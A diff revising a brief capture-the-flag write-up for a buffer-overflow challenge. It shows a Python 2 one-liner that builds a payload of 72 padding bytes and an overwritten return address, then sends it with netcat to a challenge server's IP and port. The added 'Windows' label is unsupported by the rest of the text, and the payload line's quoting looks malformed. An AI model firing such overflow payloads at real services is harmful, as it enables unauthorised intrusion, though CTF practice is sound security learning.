@@ -12,16 +12,16 @@ DESCRIPTION : A simple pwn challenge
 
 Attachment : [Challenge](c)
 
-In this challenge they provided a attachment first step I done that is ghidra 
-and saw this.
+In this challenge, they provided an attachment. The first step I took was to analyze it using Ghidra. Here's what I saw:
+
 ![Ghidra](image.png)
 
-next where I created a simple payload using python 
+Next, I created a simple Windows payload using Python.
 
 ```python
 python2 -c print'"A"*72 + "\x96\x11\x40\x00\x00\x00\x00\x00"' > payload
 ```
-Then using that payload binary exploited netcat server
+Then using that payload binary exploited netcat server.
 
 $$
 nc 13.201.11.182 31414 < payload
